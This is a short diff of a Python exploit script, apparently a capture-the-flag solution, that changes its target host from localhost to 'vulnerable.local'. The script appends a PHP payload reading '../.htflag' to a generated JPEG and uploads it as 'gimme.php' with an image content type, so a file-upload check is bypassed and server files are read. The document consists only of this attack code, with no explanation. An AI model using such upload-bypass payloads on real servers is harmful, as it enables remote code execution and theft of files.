@@ -10,7 +10,7 @@ img.save(imageContent, format="jpeg")
 imageLength = len(imageContent.getvalue())
 imageContent.write(b'<?php echo file_get_contents("../.htflag");')
 
-response = requests.post('http://127.0.0.1:8080/index.php',
+response = requests.post('http://4.vulnerable.local/index.php',
         files={'uploadedfile': ('gimme.php', imageContent.getvalue(), 'image/jpeg')})
 
 if ' has been uploaded' in response.text:
